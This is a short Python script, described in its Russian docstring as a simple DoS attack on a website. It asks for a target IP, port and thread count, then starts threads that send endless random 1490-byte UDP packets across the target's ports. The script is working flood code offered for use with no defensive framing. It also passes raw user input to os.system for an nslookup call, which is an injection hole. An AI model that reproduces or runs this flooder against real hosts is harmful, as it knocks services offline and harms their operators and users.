"""
простая dos атака на сайт
~100_000 пакетов за 20s
"""
import os
import time
import socket
import random
import threading


def attack(host, port, color='\033[92m'):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    sent = 0
    while True:
        sock.sendto(bytes, (host, port))
        sent += 1
        port += 1
        print(color + "%s packet sent to %s:%s" % (sent, host, port))
        if port == 65534:
            port = 1


if __name__ == '__main__':
    BLUE, RED, GREEN, YELLOW, CYAN, END = '\033[94m', '\033[91m', '\033[92m', '\033[93m', '\033[96m', '\033[0m'
    web = input("Target website: ")
    print(os.system(f"nslookup {web}"))

    host = input(f"{BLUE}[*] {GREEN}IP Target >>> {END} ")
    port = int(input(f"{BLUE}[*] {GREEN}PORT >>> {END} "))
    thr_counts = int(input(f"{BLUE}[*] {GREEN}Number of threads {RED}[max target = 8]  {GREEN}>>> {END} "))

    os.system("clear")
    print(f"{BLUE}Preparing for an attack{END}")
    print(f"{BLUE}ip-: {host} -port-: {port} -counts of threads-: {thr_counts} {END}")
    print(f"{CYAN} ======D     15% {END}"); time.sleep(.2)
    print(f"{CYAN} =============D      25% {END}"); time.sleep(.3)
    print(f"{CYAN} ====================D       50% {END}"); time.sleep(.4)
    print(f"{CYAN} =============================D        75% {END}"); time.sleep(.3)
    print(f"{CYAN} =====================================D     100% {END}"); time.sleep(.2)
    os.system("clear")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print(f"{GREEN}Checking the server IP and port...{END}\n"
              f"{RED}Error! Check the correct IP and Port..{END}\n")
        raise e

    colors = [BLUE, RED, GREEN, YELLOW, CYAN, '\033[95m', '\033[90m', '\033[97m',]
    for i in range(thr_counts):
        t = threading.Thread(target=attack, args=(host, port, colors[i]))
        t.start()
